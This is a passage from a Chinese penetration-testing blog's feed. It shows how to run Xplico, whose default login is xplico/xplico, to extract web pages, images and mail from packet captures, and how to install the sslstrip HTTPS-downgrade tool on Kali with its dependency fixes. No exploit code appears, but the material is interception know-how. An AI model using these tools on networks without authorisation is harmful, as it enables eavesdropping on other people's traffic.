start</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，没有输出任何信息。由于Xplico是一个基于Web服务的工具。所以，用户还需要启动Web服务。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># service apache2 start</span></span><br></pre></td></tr></table></figure><p>现在，用户就可以访问Xplico服务了。Xplico服务默认监听的端口为9876，用户可以查看监听的端口，以确定Xplico服务是否成功启动。具体如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># netstat -anptul | grep 9876</span></span><br><span class="line">tcp6     0    0 :::9876     :::*    LISTEN   431661/apache2</span><br></pre></td></tr></table></figure><p>从以上输出的信息可以看到，正在监听TCP的端口9876。由此可以说明，Xplico服务启动成功。</p><h4 id="3-5-2-使用Xplico工具快速分析网络数据"><a href="#3-5-2-使用Xplico工具快速分析网络数据" class="headerlink" title="3.5.2 使用Xplico工具快速分析网络数据"></a>3.5.2 使用Xplico工具快速分析网络数据</h4><ol><li><p>在浏览器中访问Xplico服务器，地址为 <a href="http://IP:9876/" target="_blank" rel="noopener">http://IP:9876/</a> 。访问成功后，将显示Xplico服务的登录界面，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8719.png" alt="图片19"></p></li><li><p>该界面用来登录Xplico服务。Xplico服务默认的用户名和密码都是xplico。输入用户名和密码成功登录Xplico后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8720.png" alt="图片20"></p></li><li><p>从该界面可以看到，没有任何内容。默认情况下，Xplico服务中没有任何案例及会话。需要创建案例及会话后，才可以分析捕获文件。首先创建案例，在图中选择左侧栏中的New Case选项，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8721.png" alt="图片21"></p></li><li><p>这里提供了两个分析数据的选项，分别是Uploading PCAP capture file/s和Live acquisition。其中，Uploading PCAP capture file/s选项表示上传PCAP捕获文件，并进行分析；Live acquisition选项表示实时在线捕获，并分析数据包。这里将分析捕获的数据包，在上图中选择Uploading PCAP capture file/s单选按钮。然后，指定案例名称。本例中设置案例名称为TCP，然后单击Create按钮，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8722.png" alt="图片22"></p></li><li><p>从该界面可以看到，案例已创建成功，并且在列表中显示了新建的案例。单击新建的案例名称TCP，查看案例中的会话，如下图所示。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8723.png" alt="图片23"></p></li><li><p>从该界面可以看到没有任何会话信息，接下来创建会话。在图中选择左侧栏中的New Session命令，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8724.png" alt="图片24"></p></li><li><p>在该界面Session name文本框中输入想创建的会话名称，然后单击Create按钮即可创建会话。创建成功后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8725.png" alt="图片25"></p></li><li><p>从该界面可以看到，新建了一个名为Web的会话。此时进入该会话中，就可以加载捕获文件并进行分析了。单击会话名称Web，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8726.png" alt="图片26"></p></li><li><p>该界面是用来显示捕获文件详细信息的。目前还没有上传任何捕获文件，所以单击“选择文件”按钮来选择要分析的捕获文件，然后单击Upload按钮，即可上传捕获文件。上传成功后，将显示如下图所示的界面。</p><p><img src="/2021/01/04/kali-xiu-tan-qi-pian/%E5%9B%BE%E7%89%8727.png" alt="图片27"></p></li><li><p>从该界面中的Session Data部分可以看到上传的捕获文件时间及状态。从状态（Status）行信息，可以看到解码完成（DECODING COMPLETED）。而且，此时将看到捕获文件对应的每种类型数据包的数量。该界面显示了15种类型，如HTTP、MMS、Emails、FTP-TFTP-HTTP file、Web Mail等。在该界面可以看到，HTTP类型中显示了一些包信息。在左侧栏中依次选择Web|Site命令，将显示捕获文件中请求的所有链接，用户还可以查看请求链接中的图片（Image）、视频（Video）和Flash动画等。在左侧栏中依次选择Web|Images命令，即可看到所有的图片内容，如果单击Page，将显示该图片所在的网页。</p></li></ol><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;嗅探欺骗&quot;&gt;&lt;a href=&quot;#嗅探欺骗&quot; class=&quot;headerlink&quot; title=&quot;嗅探欺骗&quot;&gt;&lt;/a&gt;嗅探欺骗&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="嗅探欺骗" scheme="http://chenzhonzhou.github.io/tags/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
  <entry>
    <title>Kali2020.4 安装sslstrip</title>
    <link href="http://chenzhonzhou.github.io/2020/12/31/kali2020-4-an-zhuang-sslstrip/"/>
    <id>http://chenzhonzhou.github.io/2020/12/31/kali2020-4-an-zhuang-sslstrip/</id>
    <published>2020-12-31T02:39:12.000Z</published>
    <updated>2020-12-31T03:09:01.457Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --><h2 id="在新版kali中安装sslstrip"><a href="#在新版kali中安装sslstrip" class="headerlink" title="在新版kali中安装sslstrip"></a>在新版kali中安装sslstrip</h2><p>在新版的kali中，内置了python3的pip没有python2的pip，sslstrip是使用python2语言开发的，所是这里我们<strong>先安装pip2</strong></p><h3 id="1-下载安装pip2"><a href="#1-下载安装pip2" class="headerlink" title="1.下载安装pip2"></a>1.下载安装pip2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># wget https://bootstrap.pypa.io/get-pip.py</span></span><br><span class="line"><span class="comment"># python2 get-pip.py</span></span><br></pre></td></tr></table></figure><p>最后一行显示<code>Successfully installed</code>就表示安装成功了。</p><h3 id="2-下载安装setuptools"><a href="#2-下载安装setuptools" class="headerlink" title="2.下载安装setuptools"></a>2.下载安装setuptools</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># git clone https://github.com/moxie0/sslstrip.git</span></span><br><span class="line"><span class="comment"># cd sslstrip</span></span><br><span class="line"><span class="comment"># python2 setup.py install</span></span><br></pre></td></tr></table></figure><h3 id="3-安装setuptools包"><a href="#3-安装setuptools包" class="headerlink" title="3.安装setuptools包"></a>3.安装setuptools包</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip2 install -U setuptools</span></span><br></pre></td></tr></table></figure><h3 id="4-安装依赖模块"><a href="#4-安装依赖模块" class="headerlink" title="4.安装依赖模块"></a>4.安装依赖模块</h3><p>以上已经成功安装了sslstrip，这里我们运行sslstrip根据报错提示，再通过pip安装你所缺少的模块。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ sslstrip</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/local/bin/sslstrip"</span>, line 27, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from twisted.web import http</span><br><span class="line">ImportError: No module named twisted.web</span><br></pre></td></tr></table></figure><p>这里提示缺少<code>twisted</code>这个模块，但是报错的时候他是提示:<code>No module named twisted.web</code>。这里只需要执行<code>pip install twisted</code>这个就好了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sslstrip</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">"/usr/local/bin/sslstrip"</span>, line 30, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from sslstrip.StrippingProxy import StrippingProxy</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/sslstrip/StrippingProxy.py"</span>, line 20, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from ClientRequest import ClientRequest</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/sslstrip/ClientRequest.py"</span>, line 25, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from twisted.internet import ssl</span><br><span class="line">  File <span class="string">"/usr/local/lib/python2.7/dist-packages/twisted/internet/ssl.py"</span>, line 59, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from OpenSSL import SSL</span><br><span class="line">  File <span class="string">"/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/__init__.py"</span>, line 8, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py"</span>, line 12, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">  File <span class="string">"/usr/lib/python2.7/dist-packages/cryptography/x509/__init__.py"</span>, line 7, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    from cryptography.x509 import certificate_transparency</span><br><span class="line">ImportError: cannot import name certificate_transparency</span><br></pre></td></tr></table></figure><p>第二个需要安装的模块是<code>pyOpenSSL</code>，执行<code>pip install pyOpenSSL</code>安装。</p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- build time:Mon Sep 27 2021 17:04:48 GMT+0800 (GMT+08:00) --&gt;&lt;h2 id=&quot;在新版kali中安装sslstrip&quot;&gt;&lt;a href=&quot;#在新版kali中安装sslstrip&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
      <category term="Kali" scheme="http://chenzhonzhou.github.io/tags/Kali/"/>
    
      <category term="渗透测试" scheme="http://chenzhonzhou.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="嗅探欺骗" scheme="http://chenzhonzhou.github.io/tags/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
  </entry>
  
</feed>
